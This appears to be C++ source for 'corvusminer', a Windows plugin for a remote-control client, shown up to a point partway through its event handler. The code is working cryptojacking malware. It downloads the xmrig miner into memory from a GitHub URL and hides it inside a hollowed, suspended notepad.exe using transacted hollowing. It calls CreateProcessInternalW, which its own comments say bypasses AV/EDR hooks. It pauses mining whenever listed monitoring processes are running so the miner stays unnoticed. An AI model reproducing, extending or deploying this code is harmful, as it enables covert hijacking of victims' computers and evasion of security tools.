#include <cstdint>
#include <cstring>
#include <cstdio>
#include <cctype>
#include <string>
#include <mutex>
#include <unordered_map>
#include <thread>
#include <chrono>
#include <vector>

/* ------------------------------------------------------------------ */
/* Platform helpers                                                    */
/* ------------------------------------------------------------------ */

#ifdef _WIN32
#  define EXPORT extern "C" __declspec(dllexport)
#  define WIN32_LEAN_AND_MEAN
#  include <windows.h>
#  include <winnt.h>

/* Include injection helpers */
#  include "delete_pending_file.h"
#  include "injection_helpers.h"
#  include "pe_hdrs_helper.h"

/* Undocumented CreateProcessInternalW - bypasses AV/EDR hooks on CreateProcessW */
static BOOL
(WINAPI *g_CreateProcessInternalW)(HANDLE hToken,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation,
    PHANDLE hNewToken
    ) = nullptr;

static bool load_kernel32_functions() {
    if (g_CreateProcessInternalW) return true;
    HMODULE hKernel32 = GetModuleHandleA("kernel32");
    if (!hKernel32) return false;
    g_CreateProcessInternalW = (BOOL(WINAPI *)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION, PHANDLE))
        GetProcAddress(hKernel32, "CreateProcessInternalW");
    return g_CreateProcessInternalW != nullptr;
}

#else
#  define EXPORT extern "C" __attribute__((visibility("default")))
#endif

/* ------------------------------------------------------------------ */
/* Host callback                                                       */
/* ------------------------------------------------------------------ */

#ifdef _WIN32
typedef void (__stdcall *host_callback_t)(
    const char *event, uintptr_t eventLen,
    const char *payload, uintptr_t payloadLen);
#else
typedef void (*host_callback_t)(
    uintptr_t ctx,
    const char *event, int eventLen,
    const char *payload, int payloadLen);
#endif

static host_callback_t g_callback = nullptr;
#ifndef _WIN32
static uintptr_t       g_callback_ctx = 0;
#endif

#ifdef _WIN32
#endif

static void send_event(const char *event, const char *payload) {
    if (!g_callback) return;
    int elen = event   ? static_cast<int>(strlen(event))   : 0;
    int plen = payload ? static_cast<int>(strlen(payload))  : 0;
#ifdef _WIN32
    g_callback(event, static_cast<uintptr_t>(elen),
               payload, static_cast<uintptr_t>(plen));
#else
    g_callback(g_callback_ctx, event, elen, payload, plen);
#endif
}

/* ------------------------------------------------------------------ */
/* Plugin state — demonstrates C++ features (std::string, maps, mutex) */
/* ------------------------------------------------------------------ */

static std::mutex g_mu;
static std::string g_client_id;
static std::unordered_map<std::string, int> g_event_counts;
static HANDLE g_mining_process = nullptr;
static std::string g_temp_xmrig_path;      /* temp path used only by CreateProcessA fallback */
static std::vector<BYTE> g_payload_buf;    /* in-memory xmrig binary (cached after first download) */
static std::vector<std::string> g_blocked_processes;
static std::string g_pool;
static std::string g_username;
static std::string g_password;
static int g_threads_hint = 100;
static std::string g_xmrig_path;
static HANDLE g_monitor_thread = nullptr;
static HANDLE g_wake_event = nullptr;   /* signaled to wake monitor thread immediately */
static bool g_monitor_running = false;
static bool g_should_be_mining = false;
static bool g_mining_start_pending = false;  /* Track if we need to spawn on monitor thread */

/* Forward declarations */
static bool are_processes_running(const std::vector<std::string> &process_names);
static void stop_xmrig();
static bool spawn_xmrig(const std::string &pool, const std::string &username,
                       const std::string &password, int threads_hint,
                       const std::vector<std::string> &kill_processes,
                       const std::string &xmrig_path, bool update_globals = true);
static void send_event(const char *event, const char *payload);

/* Check if a process handle is still valid and running */
static bool is_process_running(HANDLE hProcess) {
    if (hProcess == nullptr) return false;
#ifdef _WIN32
    DWORD exitCode = 0;
    if (GetExitCodeProcess(hProcess, &exitCode)) {
        return exitCode == STILL_ACTIVE;
    }
    return false;
#else
    return true;
#endif
}

/* Helper: Extract JSON string value */
static std::string json_extract_string(const char *json, int len, const char *key) {
    if (!json || len <= 0) return "";
    std::string haystack(json, static_cast<size_t>(len));
    std::string needle = std::string("\"" ) + key + "\":\"";
    auto pos = haystack.find(needle);
    if (pos == std::string::npos) {
        needle = std::string("\"") + key + "\": \"";
        pos = haystack.find(needle);
    }
    if (pos == std::string::npos) return "";
    pos += needle.size();
    auto end = haystack.find('"', pos);
    if (end == std::string::npos) return "";
    return haystack.substr(pos, end - pos);
}

/* Extract JSON array of strings */
static std::vector<std::string> json_extract_array(const char *json, int len, const char *key) {
    std::vector<std::string> result;
    if (!json || len <= 0) return result;
    
    std::string haystack(json, static_cast<size_t>(len));
    std::string needle = std::string("\"") + key + "\":[";
    auto pos = haystack.find(needle);
    if (pos == std::string::npos) return result;
    
    pos += needle.size();
    auto end = haystack.find(']', pos);
    if (end == std::string::npos) return result;
    
    std::string array_content = haystack.substr(pos, end - pos);
    size_t idx = 0;
    while (idx < array_content.size()) {
        /* Skip whitespace and quotes */
        while (idx < array_content.size() && (array_content[idx] == '"' || isspace(array_content[idx]) || array_content[idx] == ',')) idx++;
        if (idx >= array_content.size()) break;
        
        /* Find end of string */
        auto str_end = idx;
        while (str_end < array_content.size() && array_content[str_end] != '"') str_end++;
        if (str_end <= idx) break;
        
        result.push_back(array_content.substr(idx, str_end - idx));
        idx = str_end + 1;
    }
    return result;
}

/* Helper: Extract JSON number value */
static int json_extract_int(const char *json, int len, const char *key) {
    if (!json || len <= 0) return 0;
    std::string haystack(json, static_cast<size_t>(len));
    std::string needle = std::string("\"") + key + "\":";
    auto pos = haystack.find(needle);
    if (pos == std::string::npos) return 0;
    pos += needle.size();
    auto end = pos;
    while (end < haystack.size() && (isdigit(haystack[end]) || haystack[end] == '-')) end++;
    return std::stoi(haystack.substr(pos, end - pos));
}

/* Monitor thread for process watching */
#ifdef _WIN32
static DWORD WINAPI monitor_thread_proc(LPVOID param) {
    (void)param;
    fprintf(stderr, "[corvusminer] monitor thread started\n");
    
    while (g_monitor_running) {
        /* Wait up to 5 s, but wake immediately when g_wake_event is signaled */
        if (g_wake_event) {
            WaitForSingleObject(g_wake_event, 5000);
            ResetEvent(g_wake_event);
        } else {
            Sleep(5000);
        }

        if (!g_monitor_running) break;
        if (!g_should_be_mining) continue;
        
        std::vector<std::string> blocked_procs;
        std::string pool, username, password, xmrig_path;
        int threads_hint;
        bool mining_start_pending;
        {
            std::lock_guard<std::mutex> lk(g_mu);
            blocked_procs = g_blocked_processes;
            pool = g_pool;
            username = g_username;
            password = g_password;
            threads_hint = g_threads_hint;
            xmrig_path = g_xmrig_path;
            mining_start_pending = g_mining_start_pending;
        }
        
        bool blocked_running = are_processes_running(blocked_procs);
        bool miner_running = (g_mining_process != nullptr && is_process_running(g_mining_process));
        
        fprintf(stderr, "[corvusminer] monitor check: pending=%d, blocked_running=%d, miner_running=%d, should_be=%d, processes_to_watch=%zu\n",
                mining_start_pending, blocked_running, miner_running, g_should_be_mining, blocked_procs.size());
        
        /* Handle mining_start request — restart with new config even if already running */
        if (mining_start_pending) {
            fprintf(stderr, "[corvusminer] spawning miner from mining_start request (miner_running=%d)\n", miner_running);
            bool success = spawn_xmrig(pool, username, password, threads_hint, blocked_procs, xmrig_path, false);
            {
                std::lock_guard<std::mutex> lk(g_mu);
                g_mining_start_pending = false;
            }
            if (success) {
                fprintf(stderr, "[corvusminer] spawn successful\n");
                send_event("mining_started", "{\"message\":\"Mining started\"}");
            } else {
                fprintf(stderr, "[corvusminer] spawn failed\n");
                send_event("mining_error", "{\"error\":\"Failed to start mining\"}");
            }
        } else if (blocked_running && miner_running) {
            /* Blocked process is running - kill miner */
            fprintf(stderr, "[corvusminer] blocked process detected, killing miner\n");
            stop_xmrig();
            send_event("mining_paused", "{\"message\":\"Blocked process detected - miner paused\"}");
        } else if (!blocked_running && !miner_running && g_should_be_mining) {
            /* Blocked process stopped - restart miner */
            fprintf(stderr, "[corvusminer] blocked process no longer running, restarting miner\n");
            bool success = spawn_xmrig(pool, username, password, threads_hint, blocked_procs, xmrig_path, false);
            if (success) {
                fprintf(stderr, "[corvusminer] miner restart successful\n");
                send_event("mining_resumed", "{\"message\":\"Blocked process gone - miner resumed\"}");
            } else {
                fprintf(stderr, "[corvusminer] miner restart failed\n");
                send_event("mining_error", "{\"error\":\"Failed to restart miner\"}");
            }
        }
    }
    
    fprintf(stderr, "[corvusminer] monitor thread stopped\n");
    return 0;
}
#endif
static bool are_processes_running(const std::vector<std::string> &process_names) {
    if (process_names.empty()) return false;
    
#ifdef _WIN32
    /* Use tasklist to check for running processes */
    fprintf(stderr, "[corvusminer] checking %zu blocked processes...\n", process_names.size());
    for (const auto &proc_name : process_names) {
        std::string cmd = "tasklist /FI \"IMAGENAME eq " + proc_name + "\" 2>nul | find /I \"" + proc_name + "\" >nul";
        int result = system(cmd.c_str());
        if (result == 0) {
            fprintf(stderr, "[corvusminer] FOUND RUNNING PROCESS: %s\n", proc_name.c_str());
            return true;
        } else {
            fprintf(stderr, "[corvusminer] process not found: %s\n", proc_name.c_str());
        }
    }
#endif
    return false;
}

/* Download xmrig.exe into a heap buffer using WinHTTP.
   No file is written to disk.  Returns a filled vector on success, empty on failure. */
#ifdef _WIN32
#include <winhttp.h>

/* WinHTTP function pointer types — loaded at runtime to avoid crashing when
   the host's custom PE loader hasn't pre-loaded winhttp.dll. */
typedef HINTERNET (WINAPI *pfnWinHttpOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *pfnWinHttpConnect)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
typedef HINTERNET (WINAPI *pfnWinHttpOpenRequest)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL      (WINAPI *pfnWinHttpSendRequest)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL      (WINAPI *pfnWinHttpReceiveResponse)(HINTERNET,LPVOID);
typedef BOOL      (WINAPI *pfnWinHttpQueryHeaders)(HINTERNET,DWORD,LPCWSTR,LPVOID,LPDWORD,LPDWORD);
typedef BOOL      (WINAPI *pfnWinHttpReadData)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL      (WINAPI *pfnWinHttpCloseHandle)(HINTERNET);
typedef BOOL      (WINAPI *pfnWinHttpSetOption)(HINTERNET,DWORD,LPVOID,DWORD);

static std::vector<BYTE> download_xmrig_to_buffer() {
    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
    if (!hWinHttp) {
        fprintf(stderr, "[corvusminer] failed to load winhttp.dll: %lu\n", GetLastError());
        return {};
    }

    auto fnOpen        = (pfnWinHttpOpen)          GetProcAddress(hWinHttp, "WinHttpOpen");
    auto fnConnect     = (pfnWinHttpConnect)        GetProcAddress(hWinHttp, "WinHttpConnect");
    auto fnOpenReq     = (pfnWinHttpOpenRequest)    GetProcAddress(hWinHttp, "WinHttpOpenRequest");
    auto fnSendReq     = (pfnWinHttpSendRequest)    GetProcAddress(hWinHttp, "WinHttpSendRequest");
    auto fnRecvResp    = (pfnWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
    auto fnQueryHdr    = (pfnWinHttpQueryHeaders)   GetProcAddress(hWinHttp, "WinHttpQueryHeaders");
    auto fnReadData    = (pfnWinHttpReadData)        GetProcAddress(hWinHttp, "WinHttpReadData");
    auto fnClose       = (pfnWinHttpCloseHandle)    GetProcAddress(hWinHttp, "WinHttpCloseHandle");
    auto fnSetOption   = (pfnWinHttpSetOption)      GetProcAddress(hWinHttp, "WinHttpSetOption");

    if (!fnOpen || !fnConnect || !fnOpenReq || !fnSendReq ||
        !fnRecvResp || !fnQueryHdr || !fnReadData || !fnClose || !fnSetOption) {
        fprintf(stderr, "[corvusminer] failed to resolve WinHTTP functions\n");
        FreeLibrary(hWinHttp);
        return {};
    }

    const wchar_t *host = L"github.com";
    const wchar_t *path = L"/laprosa/CorvusMiner/raw/refs/heads/main/Client/resources/xmrig.exe";

    fprintf(stderr, "[corvusminer] downloading xmrig into memory buffer...\n");
    fflush(stderr);

    HINTERNET hSession = fnOpen(L"corvusminer/1.0",
                                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME,
                                WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "[corvusminer] WinHttpOpen failed: %lu\n", GetLastError());
        FreeLibrary(hWinHttp);
        return {};
    }

    /* 30-second connect + send/receive timeouts */
    DWORD timeout_ms = 30000;
    fnSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT,    &timeout_ms, sizeof(timeout_ms));
    fnSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT,       &timeout_ms, sizeof(timeout_ms));
    fnSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT,    &timeout_ms, sizeof(timeout_ms));

    HINTERNET hConnect = fnConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        fprintf(stderr, "[corvusminer] WinHttpConnect failed: %lu\n", GetLastError());
        fnClose(hSession);
        FreeLibrary(hWinHttp);
        return {};
    }

    HINTERNET hRequest = fnOpenReq(hConnect, L"GET", path,
                                   NULL, WINHTTP_NO_REFERER,
                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
                                   WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        fprintf(stderr, "[corvusminer] WinHttpOpenRequest failed: %lu\n", GetLastError());
        fnClose(hConnect);
        fnClose(hSession);
        FreeLibrary(hWinHttp);
        return {};
    }

    if (!fnSendReq(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                   WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !fnRecvResp(hRequest, NULL)) {
        fprintf(stderr, "[corvusminer] WinHttp request failed: %lu\n", GetLastError());
        fnClose(hRequest);
        fnClose(hConnect);
        fnClose(hSession);
        FreeLibrary(hWinHttp);
        return {};
    }

    DWORD status = 0, status_len = sizeof(status);
    fnQueryHdr(hRequest,
               WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
               WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_len,
               WINHTTP_NO_HEADER_INDEX);
    if (status != 200) {
        fprintf(stderr, "[corvusminer] download HTTP status: %lu\n", status);
        fnClose(hRequest);
        fnClose(hConnect);
        fnClose(hSession);
        FreeLibrary(hWinHttp);
        return {};
    }

    std::vector<BYTE> result;
    DWORD bytes_read = 0;
    BYTE chunk[65536];
    while (fnReadData(hRequest, chunk, sizeof(chunk), &bytes_read) && bytes_read > 0) {
        result.insert(result.end(), chunk, chunk + bytes_read);
    }

    fnClose(hRequest);
    fnClose(hConnect);
    fnClose(hSession);
    FreeLibrary(hWinHttp);

    if (result.empty()) {
        fprintf(stderr, "[corvusminer] download produced empty buffer\n");
        return {};
    }

    fprintf(stderr, "[corvusminer] downloaded xmrig (%zu bytes) into memory\n", result.size());
    fflush(stderr);
    return result;
}
#endif

/* Get path to 64-bit Windows Notepad */
static std::string get_notepad_path() {
    char sysroot[MAX_PATH] = {0};
    if (GetEnvironmentVariableA("SystemRoot", sysroot, sizeof(sysroot))) {
        return std::string(sysroot) + "\\System32\\notepad.exe";
    }
    return "C:\\Windows\\System32\\notepad.exe";
}

/* Attempt hollowing injection of payload_buf into a suspended notepad host.
   Uses SEH to catch any exception from the PE-manipulation helpers so that a
   failure never propagates out and crashes the host agent.
   Returns the process handle (caller owns it) on success, NULL on failure.
   All handles are cleaned up internally on failure. */
#ifdef _WIN32
static HANDLE try_hollow_inject(HANDLE h_section, const char *notepad_path_a,
                                const char *cmdline_a,
                                BYTE *payload_buf, DWORD file_size)
{
    int np_wlen   = MultiByteToWideChar(CP_ACP, 0, notepad_path_a, -1, nullptr, 0);
    int args_wlen = MultiByteToWideChar(CP_ACP, 0, cmdline_a,      -1, nullptr, 0);

    wchar_t *notepad_wide = new wchar_t[np_wlen];
    MultiByteToWideChar(CP_ACP, 0, notepad_path_a, -1, notepad_wide, np_wlen);

    /* lpCommandLine: "notepad.exe" <xmrig args> — argv[0] is skipped by xmrig */
    wchar_t *cmd_wide = new wchar_t[np_wlen + args_wlen + 3];
    cmd_wide[0] = L'"';
    wcscpy(cmd_wide + 1, notepad_wide);
    cmd_wide[np_wlen]     = L'"';   /* overwrite null terminator with closing quote */
    cmd_wide[np_wlen + 1] = L' ';
    MultiByteToWideChar(CP_ACP, 0, cmdline_a, -1, cmd_wide + np_wlen + 2, args_wlen);

    /* Working directory = parent of notepad */
    wchar_t start_dir[MAX_PATH] = {0};
    wcscpy(start_dir, notepad_wide);
    wchar_t *last_sep = wcsrchr(start_dir, L'\\');
    if (last_sep) *last_sep = L'\0';

    STARTUPINFOW si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};

    /* Prefer CreateProcessInternalW (bypasses AV/EDR hooks on CreateProcessW).
       Fall back to the standard API if the pointer was not resolved. */
    BOOL proc_created = FALSE;
    if (load_kernel32_functions() && g_CreateProcessInternalW) {
        fprintf(stderr, "[corvusminer] calling CreateProcessInternalW (hooked bypass)...\n");
        fflush(stderr);
        proc_created = g_CreateProcessInternalW(
            NULL,           /* hToken */
            notepad_wide,   /* lpApplicationName */
            cmd_wide,       /* lpCommandLine */
            NULL, NULL,     /* process / thread security */
            FALSE,          /* bInheritHandles */
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,           /* lpEnvironment */
            start_dir,      /* lpCurrentDirectory */
            &si, &pi,
            NULL            /* hNewToken */
        );
    } else {
        fprintf(stderr, "[corvusminer] calling CreateProcessW (standard)...\n");
        fflush(stderr);
        proc_created = CreateProcessW(
            notepad_wide,   /* lpApplicationName — explicit, no command-line parsing */
            cmd_wide,
            NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, start_dir, &si, &pi
        );
    }
    DWORD create_err = proc_created ? 0 : GetLastError();

    delete[] notepad_wide;
    delete[] cmd_wide;

    fprintf(stderr, "[corvusminer] CreateProcess returned: %d (err=0x%lX)\n",
            (int)proc_created, create_err);
    fflush(stderr);

    if (!proc_created) {
        return NULL;
    }

    fprintf(stderr, "[corvusminer] host process created (PID: %lu), injecting...\n",
            pi.dwProcessId);
    fflush(stderr);

    HANDLE result = NULL;
    PVOID remote_base = map_section_into_process(pi.hProcess, h_section,
                                                  file_size, payload_buf);
    fprintf(stderr, "[corvusminer] map_section_into_process: %p\n", remote_base);
    fflush(stderr);

    if (remote_base && redirect_entry_point(payload_buf, remote_base, pi)) {
        FlushInstructionCache(pi.hProcess, remote_base, file_size);
        Sleep(50);
        if (ResumeThread(pi.hThread) != (DWORD)-1) {
            result      = pi.hProcess;  /* caller takes ownership */
            CloseHandle(pi.hThread);
            pi.hProcess = NULL;         /* prevent cleanup below */
            pi.hThread  = NULL;
        } else {
            fprintf(stderr, "[corvusminer] ResumeThread failed: 0x%lX\n", GetLastError());
        }
    } else {
        fprintf(stderr, "[corvusminer] section map or entry-point redirect failed\n");
        fflush(stderr);
    }

    /* Terminate host process if injection failed */
    if (pi.hProcess) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return result;
}
#endif

/* Spawn xmrig process with mining config using transacted hollowing */
static bool spawn_xmrig(const std::string &pool, const std::string &username,
                       const std::string &password, int threads_hint,
                       const std::vector<std::string> &kill_processes,
                       const std::string &xmrig_path, bool update_globals) {
    /* If mining already running, stop it first to allow config update */
    if (g_mining_process != nullptr && is_process_running(g_mining_process)) {
        fprintf(stderr, "[corvusminer] stopping existing miner to apply new config\n");
        stop_xmrig();
    }
    
    /* Clean up dead process handle if any */
    if (g_mining_process != nullptr) {
        CloseHandle(g_mining_process);
        g_mining_process = nullptr;
    }
    
    /* Check if blocked processes are running */
    if (!kill_processes.empty()) {
        if (are_processes_running(kill_processes)) {
            send_event("mining_blocked", "{\"message\":\"Blocked processes running - mining blocked\"}");
            return false;
        }
    }

    /* Store mining config for monitor thread (only if not called from monitor thread) */
    if (update_globals) {
        std::lock_guard<std::mutex> lk(g_mu);
        g_blocked_processes = kill_processes;
        g_pool = pool;
        g_username = username;
        g_password = password;
        g_threads_hint = threads_hint;
        g_xmrig_path = xmrig_path;
        g_should_be_mining = true;
    }

    /* Build xmrig command-line arguments */
    std::string cmdline;
    cmdline += "-o " + pool;
    cmdline += " -u " + username;
    cmdline += " -p " + password;
    if (threads_hint > 0 && threads_hint <= 100) {
        cmdline += " --cpu-max-threads-hint=" + std::to_string(threads_hint);
    }
    cmdline += " --donate-level=3";

    /* Extract xmrig binary into memory:
       1. If user supplied a path, read from disk.
       2. Otherwise use cached download (g_payload_buf); if empty, download now and cache. */
    std::vector<BYTE> payload_vec;
    if (!xmrig_path.empty()) {
        FILE *f = fopen(xmrig_path.c_str(), "rb");
        if (f) {
            fseek(f, 0, SEEK_END);
            long sz = ftell(f);
            fseek(f, 0, SEEK_SET);
            if (sz > 0 && sz < 100 * 1024 * 1024) {
                payload_vec.resize(static_cast<size_t>(sz));
                if (fread(payload_vec.data(), 1, payload_vec.size(), f) != payload_vec.size())
                    payload_vec.clear();
            }
            fclose(f);
        }
    }

    if (payload_vec.empty()) {
        if (!g_payload_buf.empty()) {
            payload_vec = g_payload_buf;
            fprintf(stderr, "[corvusminer] using cached in-memory xmrig (%zu bytes)\n", payload_vec.size());
        } else {
            payload_vec = download_xmrig_to_buffer();
            if (!payload_vec.empty())
                g_payload_buf = payload_vec;   /* cache for monitor-thread restarts */
        }
    }

    if (payload_vec.empty()) {
        send_event("mining_error", "{\"error\":\"Failed to obtain xmrig binary\"}");
        fprintf(stderr, "[corvusminer] could not obtain xmrig binary\n");
        return false;
    }

    BYTE  *payload_buf = payload_vec.data();
    DWORD  file_size   = static_cast<DWORD>(payload_vec.size());

    fprintf(stderr, "[corvusminer] launching xmrig with: %s\n", cmdline.c_str());

    /* Create process on Windows */
#ifdef _WIN32
    /* Try transacted hollowing first — the delete-pending temp file is a transient
       implementation detail of the technique itself (marked delete-on-close before
       the section is created); the downloaded bytes are never written as a named file. */
    if (pe_is64bit(payload_buf)) {
        fprintf(stderr, "[corvusminer] attempting transacted hollowing (payload: %lu bytes)\n", file_size);

        char temp_dir[MAX_PATH] = {0};
        char temp_file_path[MAX_PATH] = {0};
        if (GetTempPathA(sizeof(temp_dir), temp_dir) &&
            GetTempFileNameA(temp_dir, "xmr", 0, temp_file_path)) {

            int wlen = MultiByteToWideChar(CP_ACP, 0, temp_file_path, -1, nullptr, 0);
            wchar_t *wide_temp = new wchar_t[wlen];
            MultiByteToWideChar(CP_ACP, 0, temp_file_path, -1, wide_temp, wlen);

            HANDLE h_section = make_section_from_delete_pending_file(wide_temp, payload_buf, file_size);
            delete[] wide_temp;

            if (h_section) {
                std::string notepad_path = get_notepad_path();
                HANDLE hInjected = try_hollow_inject(h_section, notepad_path.c_str(),
                                                     cmdline.c_str(),
                                                     payload_buf, file_size);
                CloseHandle(h_section);

                if (hInjected) {
                    g_mining_process = hInjected;
                    std::string pid_msg = "{\"pid\":" + std::to_string(GetProcessId(hInjected)) + "}";
                    send_event("mining_started", pid_msg.c_str());
                    fprintf(stderr, "[corvusminer] xmrig injected via hollowing (PID: %lu)\n",
                            GetProcessId(hInjected));
                    return true;
                }
                fprintf(stderr, "[corvusminer] hollowing failed, falling back to direct execution\n");
            } else {
                fprintf(stderr, "[corvusminer] make_section_from_delete_pending_file failed\n");
            }
        }
    } else {
        fprintf(stderr, "[corvusminer] payload is not 64-bit PE, skipping hollowing\n");
    }

    /* Fallback: write buffer to a temp file and launch directly.
       Only reaches disk if hollowing failed. */
    fprintf(stderr, "[corvusminer] launching via direct process creation (writing to temp)\n");
    {
        char temp_dir[MAX_PATH] = {0};
        char temp_path[MAX_PATH] = {0};
        if (!GetTempPathA(sizeof(temp_dir), temp_dir) ||
            !GetTempFileNameA(temp_dir, "xmr", 0, temp_path)) {
            send_event("mining_error", "{\"error\":\"Failed to create temp file for fallback\"}");
            return false;
        }

        FILE *f = fopen(temp_path, "wb");
        if (!f) {
            send_event("mining_error", "{\"error\":\"Failed to open temp file for fallback\"}");
            return false;
        }
        fwrite(payload_buf, 1, file_size, f);
        fclose(f);

        g_temp_xmrig_path = temp_path;   /* track for cleanup on stop */
        fprintf(stderr, "[corvusminer] wrote fallback temp: %s\n", temp_path);

        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;

        std::string full_cmdline = std::string(temp_path) + " " + cmdline;

        if (!CreateProcessA(
            nullptr,
            const_cast<char*>(full_cmdline.c_str()),
            nullptr, nullptr, FALSE, 0, nullptr, nullptr,
            &si, &pi)) {
            DWORD err = GetLastError();
            std::string errmsg = "{\"error\":\"Failed to spawn xmrig (error " + std::to_string(err) + ")\"}";
            send_event("mining_error", errmsg.c_str());
            fprintf(stderr, "[corvusminer] CreateProcessA failed: %lu\n", err);
            DeleteFileA(temp_path);
            g_temp_xmrig_path.clear();
            return false;
        }

        g_mining_process = pi.hProcess;
        CloseHandle(pi.hThread);

        std::string pid_msg = "{\"pid\":" + std::to_string(GetProcessId(pi.hProcess)) + "}";
        send_event("mining_started", pid_msg.c_str());
        fprintf(stderr, "[corvusminer] xmrig started directly (PID: %lu)\n", GetProcessId(pi.hProcess));
        return true;
    }
#else
    send_event("mining_error", "{\"error\":\"Mining not supported on this platform\"}");
    return false;
#endif
}

/* Stop xmrig process */
static void stop_xmrig() {
    /* If no process or process is already dead, still try cleanup */
    if (g_mining_process == nullptr) {
        send_event("mining_error", "{\"error\":\"No mining process running\"}");
        return;
    }

#ifdef _WIN32
    /* Check if process is still running */
    if (!is_process_running(g_mining_process)) {
        fprintf(stderr, "[corvusminer] mining process already terminated\n");
        CloseHandle(g_mining_process);
        g_mining_process = nullptr;
        
        /* Clean up temp xmrig file if it was extracted from resource */
        if (!g_temp_xmrig_path.empty()) {
            if (DeleteFileA(g_temp_xmrig_path.c_str()))
                fprintf(stderr, "[corvusminer] cleaned up fallback temp: %s\n", g_temp_xmrig_path.c_str());
            g_temp_xmrig_path.clear();
        }

        send_event("mining_stopped", "{\"message\":\"Mining process was already stopped\"}");
        return;
    }

    if (TerminateProcess(g_mining_process, 0)) {
        WaitForSingleObject(g_mining_process, 5000);
        CloseHandle(g_mining_process);
        g_mining_process = nullptr;

        /* Clean up fallback temp file if one was written */
        if (!g_temp_xmrig_path.empty()) {
            if (DeleteFileA(g_temp_xmrig_path.c_str()))
                fprintf(stderr, "[corvusminer] cleaned up fallback temp: %s\n", g_temp_xmrig_path.c_str());
            g_temp_xmrig_path.clear();
        }
        
        send_event("mining_stopped", "{\"message\":\"Mining process stopped\"}");
        fprintf(stderr, "[corvusminer] xmrig stopped\n");
    } else {
        send_event("mining_error", "{\"error\":\"Failed to terminate mining process\"}");
    }
#endif
}

/* ------------------------------------------------------------------ */
/* Exported ABI                                                        */
/* ------------------------------------------------------------------ */

EXPORT const char *PluginGetRuntime() {
    return "cpp";
}

#ifdef _WIN32
EXPORT void PluginSetCallback(uint64_t cb) {
    g_callback = reinterpret_cast<host_callback_t>(static_cast<uintptr_t>(cb));
}

EXPORT int PluginOnLoad(const char *hostInfo, int hostInfoLen, uint64_t cb) {
    g_callback = reinterpret_cast<host_callback_t>(static_cast<uintptr_t>(cb));
#else
EXPORT int PluginOnLoad(const char *hostInfo, int hostInfoLen,
                        uintptr_t cb, uintptr_t ctx) {
    g_callback     = reinterpret_cast<host_callback_t>(cb);
    g_callback_ctx = ctx;
#endif

    {
        std::lock_guard<std::mutex> lk(g_mu);
        g_client_id = json_extract_string(hostInfo, hostInfoLen, "clientId");
        g_event_counts.clear();
    }

    fprintf(stderr, "[corvusminer] loaded, clientId=%s\n", g_client_id.c_str());
    
    /* Start monitor thread */
#ifdef _WIN32
    g_wake_event = CreateEventW(nullptr, /*manualReset=*/TRUE, /*initialState=*/FALSE, nullptr);
    if (!g_wake_event) {
        fprintf(stderr, "[corvusminer] failed to create wake event\n");
    }
    g_monitor_running = true;
    g_monitor_thread = CreateThread(nullptr, 0, monitor_thread_proc, nullptr, 0, nullptr);
    if (!g_monitor_thread) {
        fprintf(stderr, "[corvusminer] failed to create monitor thread\n");
    }
#endif
    
    send_event("ready", "{\"message\":\"corvusminer plugin ready\"}");
    return 0;
}

EXPORT int PluginOnEvent(const char *event, int eventLen,
                         const char *payload, int payloadLen) {
    std::string ev(event, static_cast<size_t>(eventLen));

    {
        std::lock_guard<std::mutex> lk(g_mu);
        g_event_counts[ev]++;
    }

    if (ev == "ping") {
        send_event("pong", nullptr);
        return 0;
    }

    if (ev == "ui_message") {
        std::string pl(payload ? payload : "", payload ? static_cast<size_t>(payloadLen) : 0u);
        fprintf(stderr, "[corvusminer] got ui_message: %s\n", pl.c_str());
        std::string resp = "{\"message\":\"echo from C++: " + pl + "\"}";
        send_event("echo", resp.c_str());
        return 0;
    }

    if (ev == "mining_start") {
        std::string pl(payload ? payload : "", payload ? static_cast<size_t>(payloadLen) : 0u);
        std::string pool = json_extract_string(pl.c_str(), pl.size(), "pool");
        std::string username = json_extract_string(pl.c_str(), pl.size(), "username");
        std::string password = json_extract_string(pl.c_str(), pl.size(), "password");
        int threads_hint = json_extract_int(pl.c_str(), pl.size(), "threads_hint");
